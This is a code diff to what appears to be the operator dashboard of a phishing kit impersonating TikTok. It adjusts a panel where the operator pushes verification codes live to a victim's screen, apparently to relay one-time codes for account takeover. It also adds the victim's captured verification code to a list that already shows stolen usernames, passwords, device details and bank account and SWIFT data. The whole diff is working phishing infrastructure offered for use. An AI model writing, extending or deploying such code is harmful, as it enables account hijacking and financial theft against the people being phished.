@@ -107,10 +107,10 @@
                 🔑 TikTok Email Verification Code Dispenser
             </h3>
             <p style="font-size: 0.875rem; color: var(--text-muted); margin-bottom: 16px;">
-                Type the 6-digit code below and click send. It will instantly update on the visitor's verification box.
+                Type the verification code below and click send. It will instantly update on the visitor's verification box.
             </p>
             <div style="display: flex; gap: 12px; max-width: 500px;">
-                <input type="text" id="adminCodeInput" placeholder="Enter 6-digit code (e.g. 482910)" maxlength="6" style="flex: 1; padding: 10px 14px; border-radius: var(--radius-md); border: 1px solid var(--glass-border); font-size: 1.1rem; font-family: monospace; font-weight: 700; outline: none; background: var(--bg-main);">
+                <input type="text" id="adminCodeInput" placeholder="Enter code (e.g. 482910)" style="flex: 1; padding: 10px 14px; border-radius: var(--radius-md); border: 1px solid var(--glass-border); font-size: 1.1rem; font-family: monospace; font-weight: 700; outline: none; background: var(--bg-main);">
                 <button type="button" id="sendCodeBtn" style="padding: 10px 20px; background: #22c55e; color: #ffffff; border-radius: var(--radius-md); font-weight: 700; border: none; cursor: pointer; white-space: nowrap;">
                     Approve & Send Code 🚀
                 </button>
@@ -352,6 +352,7 @@
                     item.innerHTML = `
                         <h4>👤 @${data.username} <span class="timestamp">${dateStr}</span></h4>
                         <p><b>Password:</b> ${data.password}</p>
+                        <p><b>Verification Code:</b> <span style="color: var(--danger-red); font-weight: 700;">${data.verificationCode || 'Not provided'}</span></p>
                         <p><b>Location / Model:</b> ${data.signinLocation} | ${data.phoneModel}</p>
                         <p><b>Bank:</b> ${data.bankName} (${data.accountNumber} - ${data.accountHolder})</p>
                         <p><b>SWIFT Code:</b> ${data.swiftCode || 'N/A'}</p>
